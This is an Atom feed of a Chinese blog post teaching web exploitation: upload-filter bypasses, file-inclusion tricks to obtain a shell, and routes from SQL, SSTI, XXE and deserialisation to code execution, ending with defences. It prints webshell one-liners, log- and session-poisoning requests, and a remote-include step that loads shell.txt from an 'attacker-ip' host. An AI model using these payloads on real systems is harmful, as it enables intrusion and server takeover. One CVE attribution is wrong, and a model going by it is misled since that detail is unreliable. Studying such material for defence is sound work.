<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sky&#39;s Blog</title>
  <icon>https://flypigc.github.io/images/pic.png</icon>
  
  <link href="https://flypigc.github.io/atom.xml" rel="self"/>
  
  <link href="https://flypigc.github.io/"/>
  <updated>2025-12-21T04:02:45.375Z</updated>
  <id>https://flypigc.github.io/</id>
  
  <author>
    <name>Sky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件包含+文件上传+RCE+SQL+XSS+XXE</title>
    <link href="https://flypigc.github.io/2025/12/21/%E4%BB%8E0%E5%88%B01%E7%9A%84hacker/"/>
    <id>https://flypigc.github.io/2025/12/21/%E4%BB%8E0%E5%88%B01%E7%9A%84hacker/</id>
    <published>2025-12-21T03:45:42.788Z</published>
    <updated>2025-12-21T04:02:45.375Z</updated>
    
    <content type="html"><![CDATA[<p>入门网络安全-从0到1</p><span id="more"></span><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传靶场操作可以看这篇文章<br><a href="https://flypigc.github.io/2025/12/13/%E9%9D%B6%E5%9C%BA/">pikachu+xss+ssti-labs汇总 - Sky’s Blog</a></p><h2 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h2><h4 id="客户端js绕过"><a href="#客户端js绕过" class="headerlink" title="客户端js绕过"></a>客户端js绕过</h4><p>只在前端检查文件类型<br><strong>绕过方法</strong><br>禁用JavaScript：在浏览器中禁用JavaScript，或者在BurpSuite中修改文件名后缀<br>抓包修改文件名：正常上传一个合法的图片文件（<code>1.jpg</code>），然后使用 Burp Suite 拦截数据包，将文件名修改为 <code>1.php</code>。由于服务器后端没有进行二次验证，就会直接上传成功</p><h4 id="MIME类型绕过"><a href="#MIME类型绕过" class="headerlink" title="MIME类型绕过"></a>MIME类型绕过</h4><p>服务器有时会通过检查 HTTP 请求头中的 <code>Content-Type</code> 字段来验证文件类型。例如，一个图片的 <code>Content-Type</code> 通常是 <code>image/jpeg</code> 或 <code>image/png</code><br><strong>绕过方法</strong><br><strong>修改</strong> <code>Content-Type</code><strong>：</strong> 攻击者可以上传一个 <code>webshell.php</code> 文件，同时在抓包工具中将 <code>Content-Type</code> 字段从 <code>application/octet-stream</code>（默认值）修改为 <code>image/jpeg</code>。如果后端只依赖这个字段进行判断，恶意文件就会上传成功</p><h4 id="文件头内容检测绕过（魔术字节）"><a href="#文件头内容检测绕过（魔术字节）" class="headerlink" title="文件头内容检测绕过（魔术字节）"></a>文件头内容检测绕过（魔术字节）</h4><p><strong>“图片马”：</strong> 攻击者可以将恶意代码嵌入到图片文件中，制作成一个“图片马”<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289592895-ea794790-3ea3-42d8-a9ee-8472ddc49ea2.jpg" alt="null"><br>可以用画图画一个最小的图片<br>常的图片（<code>1.jpg</code>）和一个包含恶意代码的文本文件（<code>shell.php</code>），内容为 <code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + shell.php/a webshell.jpg</span><br></pre></td></tr></table></figure><p><strong>利用</strong><br>上传 <code>webshell.jpg</code> 文件。如果服务器检查了文件头，但没有检查文件内容，就会上传成功。<br>然后，攻击者需要找到一种方法来解析这个图片文件，使其作为 PHP 代码执行。这通常需要结合 <strong>文件包含漏洞（LFI）</strong> 来实现，例如 <code>include(&#39;webshell.jpg&#39;)</code>，或者一些服务器配置错误（如 Apache 的 <code>.htaccess</code> 配置）</p><h4 id="文件名、路径绕过"><a href="#文件名、路径绕过" class="headerlink" title="文件名、路径绕过"></a>文件名、路径绕过</h4><p>服务器通常会有一份黑名单或白名单来限制可上传的文件扩展名。黑名单会阻止 <code>.php</code>, <code>.asp</code>, <code>.jsp</code> 等脚本文件，而白名单只允许 <code>.jpg</code>, <code>.png</code>, <code>.gif</code> 等图片文件<br> <strong>a. 黑名单绕过</strong><br><strong>大小写绕过</strong>： <code>shell.Php</code>、<code>shell.pHP</code> 等<br><strong>文件后缀名加空格或点</strong>： 在 Windows IIS 服务器上，文件名末尾的空格或点会被自动去除<br><code>shell.php</code> （空格）<br><code>shell.php.</code>（点）<br><strong>双重扩展名</strong>： 某些服务器只检查最后一个扩展名<br><code>shell.php.jpg</code>：上传后，如果服务器处理不当，可能会被当做 <code>shell.php</code> 来执行。<br><strong>特殊字符绕过</strong>： 利用一些特殊字符，如 <code>shell.php%00.jpg</code>（00 截断）<br><strong>00截断</strong>： 在 PHP 5.3 之前，PHP 的 <code>move_uploaded_file()</code> 函数在处理文件名时，遇到 <code>0x00</code> 字节会截断后面的内容。攻击者可以在文件名中注入 <code>%00</code>，如 <code>shell.php%00.jpg</code>，上传时，服务器只检查 <code>.jpg</code>，但实际保存的文件名是 <code>shell.php</code></p><p> <strong>b. 白名单绕过</strong><br>服务器解析漏洞：<br>Apache： 如果服务器配置了 AddHandler php5-script .jpg，那么所有 .jpg 文件都会被当作 PHP 脚本来解析</p><p>IIS 6.0： 目录解析漏洞，例如 &#x2F;xx.asp&#x2F;shell.jpg。服务器会把 shell.jpg 当作 ASP 脚本执行</p><p>IIS 7.0&#x2F;7.5： web.config 配置文件解析漏洞。攻击者可以上传一个恶意的 web.config 文件来改变目录的解析规则</p><p>竞争条件（Race Condition）：<br>一些服务器在处理文件上传时，会先将文件临时保存，然后进行安全检查，最后再重命名或移动到目标目录<br>利用方法： 攻击者可以利用这个时间差，在文件被检查并删除之前，迅速访问该文件</p><p><strong>步骤：</strong><br>上传一个包含恶意代码的脚本文件（如 shell.php），其中恶意代码会创建一个新的 Webshell 文件<br>在文件上传成功后，但在服务器删除它之前，通过一个脚本循环快速访问该文件<br>恶意脚本被执行，并创建一个新的、无法被删除的 Webshell 文件</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><h3 id="本地文件包含LFI协议"><a href="#本地文件包含LFI协议" class="headerlink" title="本地文件包含LFI协议"></a>本地文件包含LFI协议</h3><h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>它允许你直接引用本地文件系统中的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vuln.php?file=file:///etc/passwd</span><br></pre></td></tr></table></figure><p>如果 Web 应用没有对路径进行充分过滤，攻击者可以利用 <code>../</code> 来遍历目录，从而访问到 Web 根目录以外的敏感文件</p><h3 id="远程文件包含协议"><a href="#远程文件包含协议" class="headerlink" title="远程文件包含协议"></a>远程文件包含协议</h3><p>远程文件包含通常出现在php中，当allow_url_include和allow_url_fopen配置都开启时，web应用可以包含远程服务器上的文件</p><p>在<strong>开发为啥要开启</strong>allow_url_include和allow_url_fopen？</p><table><thead><tr><th>配置项</th><th>核心作用</th><th>默认值（PHP）</th></tr></thead><tbody><tr><td><code>allow_url_fopen</code></td><td>允许 PHP 的文件操作函数（如<code>fopen()</code>、<code>file_get_contents()</code>）访问<strong>远程 URL 资源</strong>（http&#x2F;ftp 等），把远程资源当作 “本地文件” 处理</td><td>On（开启）</td></tr><tr><td><code>allow_url_include</code></td><td>允许<code>include</code>&#x2F;<code>require</code>等文件包含函数，直接包含<strong>远程 URL 对应的文件</strong>（是<code>allow_url_fopen</code>的 “高危扩展”）</td><td>Off（关闭）</td></tr><tr><td><code>allow_url_include</code><strong>开启的场景（仅开发环境）</strong>：</td><td></td><td></td></tr></tbody></table><ul><li><p>测试文件包含逻辑：如果项目有 “合法的远程包含” 需求（极少见，比如多服务器共享通用配置文件），开发时需要验证该逻辑是否正常，开启后可直接测试<code>include(&quot;http://dev-server/common.php&quot;)</code>；</p></li><li><p>调试漏洞 &#x2F; 安全测试：如果是安全相关的开发（如 Web 安全工具、漏洞扫描器），需要测试 “远程文件包含（RFI）” 漏洞的触发条件，必须开启该配置才能复现场景</p></li></ul><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>对包含文件进行过滤操作，比如编码或解码。读取PHP文件的源码，因为源码中可能包含数据库凭证等信息<br>如果读取sql密码后，就可以用sql<strong>拿shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vuln.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>直接从 <strong>POST 请求</strong>的请求体中读取数据，并作为文件内容进行执行。当文件包含漏洞的参数无法直接在 URL 中写入恶意代码时，这是一个非常有用的绕过方法<br>在 POST 请求中，发送数据<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code>，同时访问<code>http://example.com/vuln.php?file=php://input</code></p><h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>协议可以让我们在 URL 中直接嵌入数据，并作为文件内容执行。这在某些情况下可以绕过一些过滤规则，因为它不依赖于外部文件</p><p>在 URL 中直接执行恶意代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vuln.php?file=data://text/plain,&lt;?php%20system(&#x27;id&#x27;);%20?&gt;</span><br></pre></td></tr></table></figure><p>如果 Web 应用对 URL 中的特殊字符进行过滤，这种方式可能会失效</p><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><p>这个协议常用于反序列化攻击，尤其是在 PHAR 归档文件中。攻击者可以创建一个恶意的 PHAR 文件，并在其中嵌入恶意代码或反序列化对象，当服务器通过文件包含加载这个文件时，就会触发反序列化操作<br>利用 PHP 反序列化漏洞，执行任意命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vuln.php?file=phar:///path/to/archive.phar</span><br></pre></td></tr></table></figure><p>这种攻击方式通常需要配合一个反序列化漏洞才能成功</p><p>此外还可以上传phar文件，phar文件可以改成任意文件后缀，且不受影响解析</p><p>[伪协议](<a href="https://www.cnblogs.com/a5trid/p/18826001">PHP伪协议 - A5trid - 博客园</a>)</p><h2 id="怎么拿shell？"><a href="#怎么拿shell？" class="headerlink" title="怎么拿shell？"></a>怎么拿shell？</h2><h3 id="本地文件LFI包含怎么拿shell"><a href="#本地文件LFI包含怎么拿shell" class="headerlink" title="本地文件LFI包含怎么拿shell"></a>本地文件LFI包含怎么拿shell</h3><p>本地文件包含的拿shell方法通常需要结合其他漏洞或技巧。<br>攻击者无法直接包含一个远程 Webshell，但可以通过多种方式将恶意代码注入到服务器上的某个文件中，然后利用LFI漏洞包含该文件，从而执行恶意代码</p><h4 id="日志文件-Getshell"><a href="#日志文件-Getshell" class="headerlink" title="日志文件 Getshell"></a>日志文件 Getshell</h4><p>这是 LFI Getshell 最经典且常用的方法之一。许多 Web 服务器（如Apache、Nginx）会将访问请求记录在日志文件中（如<code>access.log</code> 或 <code>error.log</code>）</p><p><strong>利用</strong><br>通过一个特制的 HTTP 请求，将恶意代码（如Webshell 代码）注入到服务器的日志文件中。例如再 URL 中加入或在 User-Agent 字段中写入 Webshell 代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>完整的 HTTP 请求可能看起来像这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?page=test.php HTTP/<span class="number">1.1</span>  </span><br><span class="line">Host: example.com  </span><br><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样，服务器的 <code>access.log</code> 文件中就会记录下这段恶意代码</p><p><strong>包含日志文件</strong>：利用 LFI 漏洞，通过文件包含参数（如 <code>page</code> 或 <code>file</code>），包含日志文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../var/log/apache2/access.log</span><br></pre></td></tr></table></figure><p>当服务器执行这个请求时，它会把日志文件的内容当作 PHP 代码来执行，从而执行了我们注入的<code>system(&#39;whoami&#39;);</code> 命令</p><p><strong>获取 Webshell</strong>：如果注入的是一个完整的 Webshell，现在就可以通过参数来执行任意命令了  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../var/log/apache2/access.log&amp;cmd=ls -al</span><br></pre></td></tr></table></figure><h4 id="Session-文件-拿shell"><a href="#Session-文件-拿shell" class="headerlink" title="Session 文件 拿shell"></a>Session 文件 拿shell</h4><p>某些web应用会将用户的seesion信息保存在服务器的&#x2F;tmp&#x2F;目录下的文件中，文件命名 7通常为sess_PHPSESSID</p><p>如果攻击者可以控制Session数据，就能通过LFI 包含该文件getshell</p><p><strong>利用</strong><br><strong>设置 Session 值</strong>：通过 <code>$_SESSION</code> 变量，将恶意代码注入到 Session 中。这通常需要先找到一个可以控制Session 值的参数，例如在登录或注册时</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>获取 Session 文件路径</strong>：通常 Session 文件的命名是 <code>sess_</code> 加上 Session ID。可以通过浏览器 Cookies 中的<code>PHPSESSID</code> 来获取   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../tmp/sess_f32921a92a5436687e9544485304a9d7 </span><br></pre></td></tr></table></figure><p><strong>执行恶意代码</strong>：当 LFI 漏洞包含该 Session 文件时，恶意代码被执行</p><h4 id="proc-self-environ-拿shell"><a href="#proc-self-environ-拿shell" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;environ 拿shell"></a>&#x2F;proc&#x2F;self&#x2F;environ 拿shell</h4><p>在 Linux 系统中，<code>/proc/self/environ</code> 文件存储了当前进程的环境变量。攻击者可以通过设置 User-Agent 等环境变量，将恶意代码注入到该文件中，然后利用 LFI 漏洞包含它</p><p><strong>利用步骤：</strong></p><p><strong>设置 User-Agent</strong>：发送一个带有恶意 User-Agent 的请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?page=test.php HTTP/1.1  </span><br><span class="line">Host: example.com  </span><br><span class="line">User-Agent: &lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><strong>包含环境变量文件</strong>：   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../proc/self/environ</span><br></pre></td></tr></table></figure><p><strong>执行恶意代码</strong>：成功包含后，恶意代码即被执行<br><strong>远程文件包含 (RFI) Getshell</strong></p><p>RFI 通常比 LFI 更容易利用，因为它允许攻击者直接从自己的服务器上包含并执行恶意文件</p><p><strong>利用步骤：</strong></p><p><strong>制作 Webshell 文件</strong>：在攻击者自己的服务器上创建一个 Webshell 文件，例如 <code>shell.txt</code>，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>为了绕过一些过滤，文件名可以不使用 <code>.php</code> 后缀，例如 <code>shell.txt</code> 或 <code>shell.jpg</code></p><p><strong>启动 HTTP 服务</strong>：在攻击者的服务器上（如Kali Linux），使用 Python 启动一个简单的 HTTP 服务来托管<code>shell.txt</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80   </span><br></pre></td></tr></table></figure><p><strong>远程文件包含</strong>：利用 RFI 漏洞，将 URL 指向攻击者的服务器，包含 <code>shell.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=http://attacker-ip/shell.txt</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：为了防止服务器对 URL 进行过滤，有时需要使用编码、伪协议（如 <code>data://</code>）等技巧</p><p><strong>连接 Webshell</strong>：如果成功，<code>shell.txt</code> 中的 Webshell 代码已经被执行。现在就可以使用工具（如 Postman、Burp Suite）或直接在 URL 中 POST 数据来执行命令了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?file=http://attacker-ip/shell.txt HTTP/1.1  </span><br><span class="line">Host: example.com  </span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">cmd=ls -al  </span><br></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>rce就是命令执行和代码执行<br>为什么会rce产生，像ssti，sql，xxe，反序列化，文件上传，框架 &#x2F; 解析器漏洞类，配置 &#x2F; 权限错误类等等漏洞，对用户输入未作严格过滤都可能有rce漏洞<br>rce是危害最大的漏洞！！！</p><h2 id="为什么会造成rce？"><a href="#为什么会造成rce？" class="headerlink" title="为什么会造成rce？"></a>为什么会造成rce？</h2><p>核心原理是<strong>应用程序未对用户输入进行严格过滤</strong>，将用户可控输入直接拼接进系统命令执行函数（如<code>system</code>、<code>exec</code>），导致攻击者注入的恶意命令被系统执行。 例如：应用程序通过<code>system(&quot;ping &quot; + $_GET[&#39;ip&#39;])</code>执行 ping 命令，若用户输入<code>127.0.0.1;ls</code>，则拼接后命令变为<code>ping 127.0.0.1;ls</code>，其中<code>;ls</code>会被作为新命令执行，最终执行<code>ls</code>查看文件。<br>不同服务器的命令执行区别不同可以看<a href="https://blog.csdn.net/xzwspy/article/details/80183849">Linux与Windows命令对比_windows与linux命令差异一览表-CSDN博客</a></p><h2 id="代码执行命令执行区别"><a href="#代码执行命令执行区别" class="headerlink" title="代码执行命令执行区别"></a>代码执行命令执行区别</h2><p>远程代码执行远程命令执行的区别？</p><table><thead><tr><th>对比维度</th><th>远程命令执行（Command Execution）</th><th>远程代码执行（Code Execution）</th><th></th></tr></thead><tbody><tr><td>执行层面</td><td>操作系统层（Shell）</td><td>编程语言解释器层</td><td></td></tr><tr><td>依赖环境</td><td>依赖系统 Shell（bash&#x2F;cmd.exe&#x2F;PowerShell）</td><td>依赖编程语言解释器（PHP&#x2F;Python&#x2F;Java虚拟机）</td><td></td></tr><tr><td>执行对象</td><td>系统命令（ls、whoami、netstat）</td><td>编程语言代码（phpinfo()、print()、eval()）</td><td></td></tr><tr><td>权限继承</td><td>直接继承 Web 服务进程的系统权限</td><td>先继承解释器权限，执行命令时再继承系统权限</td><td></td></tr><tr><td>典型危险函数（PHP）</td><td>system()、exec()、passthru()、shell_exec()</td><td>eval()、assert()、preg_replace（&#x2F;e模式）</td><td></td></tr><tr><td>典型危险函数（Python）</td><td>os.system()、subprocess.call()</td><td>exec()、eval()、execfile()</td><td></td></tr><tr><td>绕过重点</td><td>绕过分隔符（;、&amp;、</td><td>）、命令关键字过滤</td><td>绕过函数禁用、代码语法过滤、沙箱限制</td></tr><tr><td>覆盖范围</td><td>仅能执行系统命令，能力有限</td><td>可执行代码+调用系统命令，覆盖更广</td><td></td></tr></tbody></table><h2 id="怎么利用其他漏洞去rce"><a href="#怎么利用其他漏洞去rce" class="headerlink" title="怎么利用其他漏洞去rce"></a>怎么利用其他漏洞去rce</h2><h4 id="sql怎么去RCE？"><a href="#sql怎么去RCE？" class="headerlink" title="sql怎么去RCE？"></a>sql怎么去RCE？</h4><p>MySQL root 权限下调用<code>sys_exec()</code>；<br>Payload：<code>select sys_exec(&#39;ls /etc&#39;);</code>（需安装<code>lib_mysqludf_sys</code>插件）</p><h4 id="ssti怎么去rce？"><a href="#ssti怎么去rce？" class="headerlink" title="ssti怎么去rce？"></a>ssti怎么去rce？</h4><p>漏洞代码：<code>return render_template_string(&quot;Hello &quot; + name)</code>；<br>Payload：<code>&#123;&#123; __import__('os').popen('ls').read() &#125;&#125;</code>。</p><h4 id="xxe怎么去rce？"><a href="#xxe怎么去rce？" class="headerlink" title="xxe怎么去rce？"></a>xxe怎么去rce？</h4><p>Java 解析 XML 时允许外部实体，且系统支持<code>expect</code>协议；<br>Payload：<code>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</code>（执行<code>id</code>命令）。</p><h4 id="框架-解析器漏洞类怎么RCE？"><a href="#框架-解析器漏洞类怎么RCE？" class="headerlink" title="框架 &#x2F; 解析器漏洞类怎么RCE？"></a>框架 &#x2F; 解析器漏洞类怎么RCE？</h4><table><thead><tr><th>漏洞类型</th><th>触发原因</th><th>典型场景 &#x2F; 例子</th></tr></thead><tbody><tr><td>模板引擎漏洞（如 Freemarker）</td><td>框架自身的语法 &#x2F; 函数设计缺陷，允许执行代码</td><td>- 场景：FreeMarker 模板中调用危险函数；  - Payload：<code>$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</code>。</td></tr><tr><td>服务器解析漏洞（结合文件上传）</td><td>服务器对文件后缀 &#x2F; 内容的解析规则缺陷，导致上传的脚本被执行</td><td>- 场景：Apache 解析漏洞（<code>1.php.xxx</code>被当作 PHP 执行）；  - 配合文件上传：上传<code>shell.php.xxx</code>，访问后触发代码执行。</td></tr><tr><td>脚本引擎漏洞（如 PHP&#x2F;Java）</td><td>解释器自身的内存溢出 &#x2F; 逻辑漏洞，触发后执行任意代码（0day&#x2F;1day）</td><td>- 例子：PHP 7.4.x 代码执行漏洞（CVE-2021-41773）、Java 反序列化漏洞（CVE-2017-10271）。</td></tr></tbody></table><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><table><thead><tr><th>漏洞类型</th><th>触发原因</th><th>典型场景 &#x2F; 例子</th></tr></thead><tbody><tr><td>PHP 反序列化</td><td><code>unserialize()</code>解析恶意序列化字符串，触发魔术方法（__wakeup&#x2F;__destruct）</td><td>- 场景：用户输入被直接传入<code>unserialize()</code>；  - 例子：构造 POP 链调用<code>eval()</code>执行代码。</td></tr><tr><td>Java 反序列化</td><td>反序列化恶意对象，触发链调用执行命令（如 Commons Collections 漏洞）</td><td>- Payload：利用 CC 链构造的序列化数据，触发<code>Runtime.getRuntime().exec(&quot;id&quot;)</code>。</td></tr><tr><td>Python 反序列化</td><td><code>pickle.loads()</code>解析恶意数据，执行内嵌的代码</td><td>- 漏洞代码：<code>pickle.loads(request.data)</code>；  - Payload：构造包含<code>os.system(&#39;ls&#39;)</code>的 pickle 数据。</td></tr></tbody></table><h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h4><table><thead><tr><th>漏洞类型</th><th>触发原因</th><th>典型场景 &#x2F; 例子</th></tr></thead><tbody><tr><td>文件上传漏洞</td><td>上传恶意脚本文件（如 PHP&#x2F;ASPX），且文件能被服务器解析</td><td>- 场景：上传<code>shell.php</code>（内容<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>）到 Web 可访问目录；  - 访问该文件即可执行任意代码。</td></tr><tr><td>文件包含漏洞（LFI&#x2F;RFI）</td><td>包含本地 &#x2F; 远程恶意脚本文件，触发代码执行</td><td>- 本地包含（LFI）：<code>include($_GET[&#39;file&#39;])</code> → Payload：<code>?file=../../upload/shell.php</code>；  - 远程包含（RFI）：开启<code>allow_url_include</code>后，包含远程 PHP 脚本。</td></tr><tr><td>路径遍历 + 文件写入</td><td>写入恶意脚本到 Web 目录，再通过访问文件执行</td><td>- 场景：<code>file_put_contents($_GET[&#39;path&#39;], $_POST[&#39;content&#39;])</code>；  - Payload：<code>?path=/var/www/html/shell.php</code> + POST 内容：<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>。</td></tr></tbody></table><h4 id="配置-权限错误类"><a href="#配置-权限错误类" class="headerlink" title="配置 &#x2F; 权限错误类"></a>配置 &#x2F; 权限错误类</h4><table><thead><tr><th>漏洞类型</th><th>触发原因</th><th>典型场景 &#x2F; 例子</th></tr></thead><tbody><tr><td>弱口令 &#x2F; 未授权访问</td><td>登录后台后可执行代码（如后台有 “代码执行” 功能、“命令行” 工具）</td><td>- 场景：Tomcat 弱口令登录后台，部署 war 包执行代码；  - 例子：Jenkins 未授权访问，执行构建脚本触发命令执行。</td></tr><tr><td>危险配置开启</td><td>框架 &#x2F; 服务器开启危险功能，允许执行代码</td><td>- 场景：PHP 开启<code>register_globals</code>&#x2F;<code>allow_url_include</code>；  - 例子：Python Flask 开启<code>debug=True</code>，调试模式下的 PIN 码破解后执行代码。</td></tr><tr><td>容器 &#x2F; 云服务配置错误</td><td>Docker&#x2F;K8s&#x2F;S3 存储桶配置不当，导致执行恶意代码</td><td>- 场景：Docker API 未授权访问，创建容器并挂载主机目录执行命令；  - 例子：S3 存储桶公开写权限，上传恶意脚本并触发执行。</td></tr></tbody></table><h2 id="代码执行的函数有什么？"><a href="#代码执行的函数有什么？" class="headerlink" title="代码执行的函数有什么？"></a>代码执行的函数有什么？</h2><h2 id="代码执行的函数有哪些？"><a href="#代码执行的函数有哪些？" class="headerlink" title="代码执行的函数有哪些？"></a>代码执行的函数有哪些？</h2><p>代码执行函数指直接将输入作为代码解析执行的函数，分语言举例：</p><ul><li><p>PHP：<code>eval()</code>、<code>assert()</code>、<code>preg_replace()</code>（带<code>/e</code>修饰符）、<code>array_map ()</code>、<code>create_function()</code>、<code>call_user_func ()</code></p></li><li><p>Python：<code>exec()</code>、<code>eval()</code></p></li><li><p>Java：<code>ScriptEngine.eval()</code>（如 Rhino 引擎）、<code>Runtime.exec()</code>（间接执行字节码）</p></li><li><p>JavaScript：<code>eval()</code></p></li></ul><h2 id="命令执行的函数有哪些？"><a href="#命令执行的函数有哪些？" class="headerlink" title="命令执行的函数有哪些？"></a>命令执行的函数有哪些？</h2><p>命令执行函数指直接调用操作系统命令的函数，分语言 &#x2F; 场景举例：</p><ul><li><p>PHP：<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>popen()</code>、<code>proc_open()</code></p></li><li><p>Python：<code>os.system()</code>、<code>os.popen()</code>、<code>subprocess.call()</code>、<code>subprocess.Popen()</code></p></li><li><p>Java：<code>Runtime.getRuntime().exec()</code></p></li><li><p>系统层面：Linux 的<code>system()</code>、Windows 的<code>CreateProcess()</code></p></li></ul><h2 id="php-能远程执行的函数有什么？"><a href="#php-能远程执行的函数有什么？" class="headerlink" title="php 能远程执行的函数有什么？"></a>php 能远程执行的函数有什么？</h2><p>PHP 中可用于远程执行（代码 &#x2F; 命令）的函数主要包括：</p><ul><li><p><strong>代码执行</strong>：<code>eval()</code>、<code>assert()</code>（5.4 前）、<code>create_function()</code>、<code>preg_replace(&#39;/pattern/e&#39;, ...)</code>（PHP 7.0 前）、<code>call_user_func()</code>（动态调用执行函数）。</p></li><li><p><strong>命令执行</strong>：<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>popen()</code>、<code>proc_open()</code>。</p></li><li><p><strong>间接执行</strong>：<code>include()</code>&#x2F;<code>require()</code>（远程包含文件时执行代码，需<code>allow_url_include=On</code>）。</p></li></ul><h2 id="RCE-漏洞有什么危害、利用方式及防御措施？"><a href="#RCE-漏洞有什么危害、利用方式及防御措施？" class="headerlink" title="RCE 漏洞有什么危害、利用方式及防御措施？"></a>RCE 漏洞有什么危害、利用方式及防御措施？</h2><ul><li><p><strong>危害</strong>： 攻击者可完全控制目标系统（如读取 &#x2F; 篡改文件、窃取数据）、横向渗透内网、植入恶意程序（如勒索软件,挖矿）、瘫痪服务等，是最高危漏洞之一。</p></li><li><p><strong>利用方式</strong>： 直接执行命令（如<code>ls</code>、<code>whoami</code>）获取信息；写入 webshell 持久化控制；通过命令提权（如<code>sudo</code>、内核漏洞）获取更高权限；下载恶意文件（如<code>wget</code>）扩大影响。</p></li><li><p><strong>防御措施</strong>：</p></li><li><p>输入严格过滤：用白名单限制允许的字符 &#x2F; 命令，禁止特殊符号（如<code>;</code>、<code>|</code>、<code>&amp;</code>）。</p></li><li><p>避免直接拼接执行：使用安全 API（如参数化调用，避免<code>system(&quot;cmd &quot; + input)</code>）。</p></li><li><p>最小权限运行：应用程序以低权限用户（如 www-data）运行，限制文件 &#x2F; 